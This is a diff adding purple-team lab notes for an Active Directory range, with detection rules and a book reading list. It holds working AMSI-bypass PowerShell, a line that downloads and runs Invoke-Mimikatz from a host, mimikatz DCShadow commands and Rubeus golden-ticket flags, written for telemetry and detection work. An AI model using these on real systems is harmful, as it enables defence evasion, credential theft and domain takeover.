@@ -2520,6 +2520,410 @@ level: high
 
 ---
 
+## Mechanics: Item #109 — AMSI Bypass Techniques (Gray Hat Hacking 6th Ed) [STUB — UNTESTED]
+
+**Status:** ⏳ STUB — added 2026-06-25 session 13. Source: Gray Hat Hacking 6th Ed (`C:\STUDY\Github\CADRE-Courses\ebooks\Gray_Hat_Hacking_The_Ethical_Hacker_s_Handbook,_Sixth_Edition,_6th\`).
+
+**Why it works:**
+- AMSI (Antimalware Scan Interface) intercepts PowerShell script content before execution
+- AMSI bypass techniques disable or patch AMSI to allow unscanned script execution
+- Common before mimikatz, Rubeus, or any PowerShell-based payload delivery
+
+**Attack workflow (3 known techniques from book):**
+```powershell
+# Technique 1: amsiInitFailed flag manipulation
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Technique 2: AmsiScanBuffer memory patching (x64)
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+Add-Type $Win32
+$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
+$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
+$Patch = [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)  # mov eax, 0x80070057; ret
+[Win32]::VirtualProtect($Address, [UIntPtr]::SizeOf($Patch), 0x40, [ref]$Protect)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+# Now AMSI is patched; run mimikatz
+iex (New-Object Net.WebClient).DownloadString('http://192.168.77.60:8080/Invoke-Mimikatz.ps1')
+
+# Technique 3: Forcing an error (amsiInitFailed variant)
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null, $null)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, [IntPtr]::Zero)
+```
+
+**Success modes (attacker):**
+- AMSI bypass silent — no error, no ScriptBlock logging capture
+- Mimikatz/Rubeus runs without Defender detection
+- WinSec 4104 (ScriptBlock logging) may NOT capture if bypass succeeds before content is scanned
+
+**Failure modes (defender):**
+- WinSec 4103 (Module logging) captures `System.Management.Automation.AmsiUtils` reflection
+- WinSec 4104 (ScriptBlock logging) captures if bypass happens AFTER script starts
+- Defender catches malicious behavior even with bypass (e.g., network connections, registry access)
+- Constrained Language Mode prevents Add-Type (Technique 2 blocked)
+- AMSI provider DLL signature verification (Tamper Protection) catches Technique 2
+
+**CADRE-specific notes:**
+- Defender disabled per `04-vulnerabilities.yml` — AMSI bypass is **theoretical** in lab
+- For realistic test: re-enable Defender + AMSI + Tamper Protection on mbr01
+- Combined with Item #108 (Defender exclusion): either skip AMSI entirely OR use exclusion + AMSI bypass for maximum stealth
+- Mimikatz already at `C:\Tools\` on mbr01
+
+**Telemetry fingerprint (expected when Defender active):**
+- WinSec 4104 (ScriptBlock logging) — `amsiInitFailed` or `[Ref].Assembly` in script
+- WinSec 4688 + Sysmon EID 1 — `powershell.exe` with suspicious command patterns
+- Sysmon EID 7 (ImageLoad) — `amsi.dll` loaded by unexpected process
+- Sysmon EID 8 (CreateRemoteThread) — possible AmsiScanBuffer patching
+
+**Detection engineering (held for plan1.7 §17):**
+- Elastic KQL: `process.command_line:*amsi* or process.command_line:*AmsiScanBuffer* or process.command_line:*amsiInitFailed*`
+- Sigma: `win_amsi_bypass.yml` candidate — `selection: Image|endswith: powershell.exe AND CommandLine|contains: ('amsiInitFailed' OR 'AmsiScanBuffer' OR 'amsi.dll')`
+- Atomic Red Team test T1562.012 (Impair Defenses: Disable or Modify Tools — AMSI bypass)
+
+**Common pitfalls:**
+- Constrained Language Mode blocks Add-Type — Technique 2 fails
+- PowerShell v7+ has additional AMSI hooks (more bypass needed)
+- Defender memory scanning catches bypass DLLs
+- Custom AMSI providers (3rd-party EDR) bypass Technique 1
+
+**Wireshark field reference:**
+- Not applicable (host-based, not network)
+
+**Reproduction checklist (Phase 3 test — when Defender enabled):**
+- [ ] Phase 1-2.5 complete (admin/SYSTEM on mbr01)
+- [ ] Re-enable Defender + AMSI + Tamper Protection on mbr01
+- [ ] Verify AMSI active: run `Invoke-Expression "Invoke-Mimikatz"` and check if Defender blocks
+- [ ] Run AMSI bypass Technique 1
+- [ ] Run Invoke-Mimikatz — verify NOT detected
+- [ ] Capture WinSec 4104, 4688, Sysmon EID 1, 7 telemetry
+- [ ] Cleanup: remove AMSI bypass + re-disable Defender for lab
+- [ ] Document telemetry in `tracker.md`
+- [ ] Deploy Sigma rule via `sigma_translate` MCP tool (DFIR-Nexus)
+- [ ] Validate with Atomic Red Team T1562.012
+
+**Cross-references:**
+- Campaign_suggestions.md #109 (full entry)
+- Gray Hat Hacking 6th Ed chapter on bypassing AV
+- Item #106 (Atomic Red Team T1562.012)
+- Item #108 (Defender exclusion — alternative approach)
+- plan1.7 §17 (held)
+- Track C (Sigma)
+
+---
+
+## Mechanics: Item #110 — DCShadow Attack [STUB — UNTESTED]
+
+**Status:** ⏳ STUB — added 2026-06-25 session 13. Sources: Applied Incident Response + Practical-Red-Teaming.
+
+**Why it works:**
+- DCShadow is the **inverse of DCSync**: instead of pulling data from DC, attacker **pushes changes**
+- Attacker registers a rogue DC via `drsuapi` (Directory Replication Service Remote Protocol)
+- Requires **2 mimikatz sessions** on the same DC: one to register, one to push
+- Used to inject fake SID history, fake SPN, fake group membership, fake user attributes
+- Rare technique — not commonly seen in DFIR reports, so detection coverage is thin
+
+**Attack workflow (Mimikatz DCShadow):**
+```powershell
+# On mbr01 as DA (post-Phase 6)
+# Session 1 — Register rogue DC
+mimikatz.exe
+privilege::debug
+lsadump::dcshadow /object:CN=krbtgt,CN=Users,DC=child,DC=cadre,DC=local /attribute:servicePrincipalName /value:"FAKE/spn"
+
+# Session 2 (separate mimikatz process on same machine) — Push change
+mimikatz.exe
+privilege::debug
+lsadump::dcshadow /push
+
+# After: krbtgt account has FAKE/spn SPN — Kerberoastable!
+# Or inject SID history to fake privileges
+```
+
+**Variant — push SID history:**
+```powershell
+# Inject fake SID history into a low-priv user
+lsadump::dcshadow /object:CN=analyst_t1,OU=Users,DC=child,DC=cadre,DC=local /attribute:sIDHistory /value:S-1-5-21-<domain>-519
+# Now analyst_t1 effectively has Enterprise Admin via SID history
+```
+
+**Success modes (attacker):**
+- Rogue DC registered successfully — change pushed to legitimate DC
+- Fake SID history / SPN / group membership persists in AD database
+- Hard to detect (legitimate-looking DRS replication events)
+
+**Failure modes (defender):**
+- DRS replication events require admin — WinSec 4662 from non-DC source is anomalous
+- WinSec 5136 (Directory Service Changes) — schema attribute modified
+- Zeek DCE-RPC — `drsuapi` opnum 0/1 (DRSGetNCChanges/DRSAddEntry) from non-DC IP
+- Requires DA-level access (post-Phase 6 in our campaign)
+
+**CADRE-specific notes:**
+- Requires DA on mbr01 (post-Phase 6) + 2 separate sessions
+- More "blue team" realistic than DCSync (stealthier persistence)
+- Alternative to DCSync for post-DA persistence
+- Cross-forest variant possible (Phase 8 — fake trust attributes)
+
+**Telemetry fingerprint:**
+- WinSec 4662 (DS Object Access) — high-volume on DC from non-DC source IP
+- WinSec 5136 (Directory Service Changes) — schema attribute modified
+- WinSec 4670 (Permissions Changed on Object) — DC permissions modified
+- DRS replication event from non-DC IP (legitimate replication comes from other DCs only)
+- Zeek `dce_rpc.log` — `drsuapi` operations from non-DC
+- Sysmon EID 1 — multiple mimikatz processes
+
+**Detection engineering (held for plan1.7 §17):**
+- Elastic KQL: `event.code:4662 and source.ip:(* and not 192.168.77.10,11,12) and winlog.event_data.ObjectDN:*CN=*`
+- Sigma: `win_dcshadow_attack.yml` candidate — `selection: EventID: 4662 AND SubjectUserName: NOT *DC* AND ObjectDN: *CN=*`
+- Suricata SID (proposed): SID:1000105 (DRS replication from non-DC)
+- Atomic Red Team test T1003 (OS Credential Dumping) — DCShadow variant
+
+**Common pitfalls:**
+- Requires 2 simultaneous sessions on DC — easy to miss in test setup
+- Must be on DC or have replicated AD database access
+- Detection limited (DCShadow is rare — most SIEMs don't have specific rules)
+
+**Wireshark field reference:**
+- DCE-RPC over SMB (port 445) or TCP (port 135)
+- `drsuapi` interface UUID `e3514235-4b06-11d1-ab04-00c04fc2dcd2`
+- Opnum 0 (`DRSGetNCChanges`) — replication pull
+- Opnum 1 (`DRSAddEntry`) — replication push (DCShadow specific)
+- Opnum 5 (`DRSReplicaAdd`) — DC registration
+- Opnum 12 (`DRSReplicaDel`) — DC deregistration
+
+**Reproduction checklist (Phase 7 test):**
+- [ ] Phase 6 complete (DCSync + DA on mbr01)
+- [ ] Snapshot dc01 (in case DCShadow corrupts AD database)
+- [ ] Run Session 1 (register) + Session 2 (push) on mbr01
+- [ ] Verify change applied to AD (e.g., test fake SPN via `Get-ADUser -Properties servicePrincipalName`)
+- [ ] Capture WinSec 4662, 5136, 4670 telemetry
+- [ ] Capture Zeek DCE-RPC drsuapi events
+- [ ] Cleanup: revert DCShadow changes + restore dc01 snapshot
+- [ ] Document telemetry in `tracker.md`
+- [ ] Deploy Elastic KQL + Sigma rule
+
+**Cross-references:**
+- Campaign_suggestions.md #110 (full entry)
+- Applied Incident Response Ch on lateral movement / DCShadow
+- Practical-Red-Teaming Ch on DCShadow
+- Phase 6 (DCSync — opposite direction), Item #66 (Forest Trust SID Filtering)
+- plan1.7 §17 (held)
+- Item #106 (Atomic Red Team T1003 — DCShadow variant)
+
+---
+
+## Mechanics: Item #111 — Rubeus/Kerberoast/AS-REP playbook cross-validation [STUB — UNTESTED]
+
+**Status:** ⏳ STUB — added 2026-06-25 session 13. Sources: Practical-Red-Teaming + Gray Hat Hacking 6th Ed.
+
+**Why it works:**
+- Field-tested red team playbooks from these books may use Rubeus flags we haven't tried
+- Cross-validation ensures our Phase 1/2/7 commands are comprehensive
+
+**Attack workflow (verify existing + test new flags):**
+
+#### Phase 1 — AS-REP Roast (cross-validate)
+```powershell
+# Existing (verify)
+.\Rubeus.exe asreproast /user:intern_blue /dc:192.168.77.11 /nowrap
+
+# Try book flags (potential additions)
+/rc4opsec        # Request RC4-encrypted AS-REP even if AES supported (stealthier)
+/authexp         # Expiration time control
+/domain:child.cadre.local   # Specify domain explicitly
+/format:hashcat   # Output in hashcat format directly
+```
+
+#### Phase 2 — Kerberoast (cross-validate)
+```powershell
+# Existing (verify)
+/aes              # AES Kerberoast (mode 13100) — preferred per Microsoft
+/user:svc_mssql
+/domain:child.cadre.local
+/dc:192.168.77.11
+/nowrap
+
+# Try book flags
+/spn:HTTP/mbr01.cadre.local   # Specific SPN targeting
+/tgtdeleg         # Use S4U2Self/Kerberos delegation path
+/rc4opsec         # Request RC4 even if AES supported
+/simple            # Simplified output
+/passwords         # Auto-extract TGS hashes
+```
+
+#### Phase 7 — Golden Ticket (cross-validate)
+```powershell
+# Existing (verify)
+/aes256            # AES256 encryption (modern)
+/user:Administrator
+/domain:child.cadre.local
+/sid:S-1-5-21-...
+/krbtgt:HASH
+/ptt              # Pass-the-ticket
+
+# Try book flags
+/sid:S-1-5-21-<child>-519   # Cross-forest Enterprise Admin SID (post Phase 8)
+/groups:500,512,513,518,519,520  # Enterprise/Schema Admins + Domain Admins
+/oldpac                            # Use old PAC format (compatibility)
+/newpac                            # Use new PAC format (modern)
+/s4u                               # S4U2Self/S4U2Proxy extension
+```
+
+**Success modes:**
+- All existing Phase 1/2/7 commands work as documented
+- New flags produce different output formats / additional info
+- Cross-validation confirms attack chain completeness
+
+**Failure modes (test gaps found):**
+- Missing `/aes` flag = AES downgraded to RC4 (different hashcat mode)
+- Missing `/domain` = Rubeus auto-detects wrong domain
+- Missing `/tgtdeleg` = doesn't use S4U2Self/Kerberos delegation path
+- Missing SID history in golden ticket = doesn't get Enterprise Admin across forests
+
+**CADRE-specific notes:**
+- All 3 phases already verified per `tracker.md` (WT003 AS-REP, WT002 AES Kerberoast, WT010 Golden Ticket)
+- Cross-validation is documentation/test coverage work — verify existing + identify gaps
+- Book flags may help with detection evasion (e.g., `/rc4opsec` for AS-REP)
+
+**Detection (existing — verify coverage):**
+- SID:1000015 (Kerberoast burst — 7 fires baseline)
+- ET:2000002 (AS-REP roast — 37 fires baseline)
+- WT017 PrinterBug Suricata SID:1000050 (12 fires baseline)
+
+**Cross-references:**
+- Campaign_suggestions.md #111 (full entry)
+- Practical-Red-Teaming + Gray Hat Hacking 6th Ed
+- Existing Phase 1 (WT003), Phase 2 (WT002), Phase 7 (WT010) Mechanics
+- Item #90 (NetExec — alternative tool)
+
+---
+
+## Reference Books — CADRE-Courses/ebooks/ Survey (2026-06-25) [STUDY]
+
+**Status:** 📚 STUDY REFERENCE — 11 books added as study reference per `Campaign_suggestions.md` "ebooks Survey (2026-06-25)". Books live at `C:\STUDY\Github\CADRE-Courses\ebooks\`. NO new attack Mechanics — these are reference material for the CADRE campaign.
+
+### Tier 1 (7 books — full reference)
+
+#### 📚 SANS Purple Team Tools Poster (Van Buggenhout/Bauters)
+**File:** `C:\STUDY\Github\CADRE-Courses\ebooks\UTF-8=''Digital-Poster_Purple-Team_Tools\` (64 KB)
+**Chapter → CADRE phase mapping:**
+| Book section | CADRE relevance |
+|---|---|
+| Red team tools (BloodHound, Mimikatz, PowerView, PowerUp, C2 matrix) | Phase 0/3/4 + Track H (CADRE-Strike) |
+| Blue team tools (Suricata, Sigma, Sysmon, AppLocker, OSSEC, OSQuery) | plan1.7 + plan1.7 §9-12 (Network) |
+| FIN6 emulation with MITRE technique IDs | All phases (template) |
+| APT28/APT33 emulation | Plan 11 (Cloud/Entra) — not main spine |
+
+#### 📚 Practical-Red-Teaming (Tumne 2023)
+**File:** `C:\STUDY\Github\CADRE-Courses\ebooks\Practical-Red-Teaming\` (317 KB)
+**Chapter → CADRE phase mapping:**
+| Book section | CADRE relevance |
+|---|---|
+| AD enumeration chapters | Phase 0 (Recon) |
+| Rubeus / Kerberoast / AS-REP chapters | Phase 1/2 — Item #111 cross-validation |
+| Mimikatz chapters | Phase 3.5 (Credential Theft) |
+| Zerologon chapter | Item #33 (CVE-2026-41089 superseded) |
+
+#### 📚 Applied Incident Response (Anson)
+**File:** `C:\STUDY\Github\CADRE-Courses\ebooks\Applied Incident Response\` (1002 KB)
+**Chapter → CADRE phase mapping:**
+| Book chapter | CADRE relevance |
+|---|---|
+| Ch 1-3: Threat Landscape + IR Readiness | DFIR-Nexus positioning |
+| Ch 4-6: Memory/Disk Forensics | Plan 0.7/0.9 (KAPE + Volatility) |
+| Ch 7-9: Network Monitoring + Event Log | plan1.7 §9 (SANS SEC503/FOR572) |
+| Ch 10-12: Lateral Movement + DCShadow | Phase 5/6 + Item #110 DCShadow |
+| Ch 13-14: Reporting + IR Playbooks | DFIR-Nexus case reports |
+
+#### 📚 Gray Hat Hacking 6th Ed
+**File:** `C:\STUDY\Github\CADRE-Courses\ebooks\Gray_Hat_Hacking_The_Ethical_Hacker_s_Handbook,_Sixth_Edition,_6th\` (1720 KB)
+**Chapter → CADRE phase mapping:**
+| Book chapter | CADRE relevance |
+|---|---|
+| AD attack chapters (Mimikatz, SharpHound, DCSync, Rubeus) | Phase 3.5/6/7 |
+| AMSI bypass chapter | Phase 3 + Item #109 |
+| PowerShell exploitation | Phase 3.5 (LSASS dump) |
+
+#### 📚 Windows Internals Part 1, 7th Ed (2017)
+**File:** `C:\STUDY\Github\CADRE-Courses\ebooks\Windows Internals, Part 1, 7th Edition - 2017\` (1720 KB)
+**Chapter → CADRE phase mapping:**
+| Book chapter | CADRE relevance |
+|---|---|
+| Ch 3: Process and Thread internals | Phase 3.5 (process access to LSASS) |
+| Ch 5: Memory management | Sysmon EID 10 (ProcessAccess) detection |
+| Ch 7: Security mechanisms (UAC, Credential Guard, VBS) | Phase 3.5 alt (Credential Guard bypass) |
+| Ch 8: Token model | Phase 3.5 (Token impersonation) |
+| Ch 9-12: I/O, Storage, Networking, Registry | plan1.7 (Sysmon EID 11-14) |
+
+#### 📚 Cyber Threat Hunting
+**File:** `C:\STUDY\Github\CADRE-Courses\ebooks\Cyber_TH\` (838 KB)
+**Chapter → CADRE phase mapping:**
+| Book section | CADRE relevance |
+|---|---|
+| Hypothesis-driven hunting | plan1.7 (Detection Engineering) |
+| MITRE ATT&CK mapping | plan1.7 (technique IDs) |
+| Statistical/ML clustering | DFIR-Nexus + plan1.7 advanced |
+| Deception (honey tokens) | Plan 11 (Cloud/Entra) |
+
+#### 📚 Practical Threat Detection Engineering (Mihailescu)
+**File:** `C:\STUDY\Github\CADRE-Courses\ebooks\Practical.Threat.Detection.Engineering\` (616 KB)
+**Chapter → CADRE phase mapping:**
+| Book chapter | CADRE relevance |
+|---|---|
+| Detection methodology | plan1.7 §1 (philosophy) |
+| Sigma rule authoring | plan1.7 §16 (Sigma Rule Library) |
+| Whisker (Shadow Credentials) | Phase 5 + plan1.7 |
+| ProcDump LSASS detection | Phase 3.5 + plan1.7 |
+
+### Tier 2 (4 books — selective reference)
+
+#### 📚 Practical AI Security (2025)
+**File:** `C:\STUDY\Github\CADRE-Courses\ebooks\Practical AI Security\` (837 KB, 2025)
+**Chapter → CADRE mapping:**
+| Book section | CADRE relevance |
+|---|---|
+| Prompt injection (x72) | Track H (CADRE-Strike) + Item #107 (GitHub Actions guardrails) |
+| RAG poisoning (x112) | DFIR-Nexus RAG (C.0.1) + Item #107 |
+| Backdoor attacks (x41) | Track H (CADRE-Strike) |
+| Supply chain attacks (x29) | Item #107 (Plan 0.8 F-11/F-12) |
+
+#### 📚 Brc4
+**File:** `C:\STUDY\Github\CADRE-Courses\ebooks\Brc4\` (204 KB)
+**Use case:** Quick syntax lookup when implementing Phase 3.5 + Phase 5 attacks.
+
+#### 📚 Windows Internals Part 2, 7th Ed (2021)
+**File:** `C:\STUDY\Github\CADRE-Courses\ebooks\Windows Internals, Part 2. 7th Edition - 2021\` (1720 KB)
+**Chapter → CADRE mapping:** Storage/I/O/networking/registry internals. Reference for plan1.7 EDR rule writing (Sysmon EID 11/12/13/14).
+
+#### 📚 eb-powershell-in-a-month-of-lunches
+**File:** `C:\STUDY\Github\CADRE-Courses\ebooks\eb-powershell-in-a-month-of-lunches\` (647 KB)
+**Chapter → CADRE mapping:** Reference for Phase 3.5/5+ PowerShell scripting (PSRemoting, WMI, AD module).
+
+### Reproduction checklist (study-only, no test commands)
+- [ ] Read SANS Purple Team Tools Poster — single pass, one-stop reference
+- [ ] Read Practical-Red-Teaming Ch on Rubeus — verify Phase 1/2/7 commands
+- [ ] Read Applied Incident Response Ch 10-12 (DCShadow) — for Item #110
+- [ ] Read Gray Hat Hacking AMSI bypass chapter — for Item #109
+- [ ] Read Windows Internals Part 1 Ch 7-8 (Security + Tokens) — for Phase 3.5
+- [ ] Read Cyber Threat Hunting Ch 1-3 (hypothesis-driven) — for plan1.7
+- [ ] Read Practical Threat Detection Engineering Ch on Sigma — for plan1.7 §16
+- [ ] Read Practical AI Security Ch on prompt injection — for Track H (CADRE-Strike)
+- [ ] Note any new techniques worth adding to Campaign_suggestions.md
+
+### Cross-references
+- All Campaign_suggestions.md items #109-115
+- See CAMPAIGNS.md "Study Reference Library" section for full chapter-to-phase mappings
+- See `docs/internal/references/ad-tools-landscape-2026-06-24.md` for related tool inventory
+
+---
+
 
 ## Mechanics: Phase 3.5 — Credential Theft from SYSTEM
 
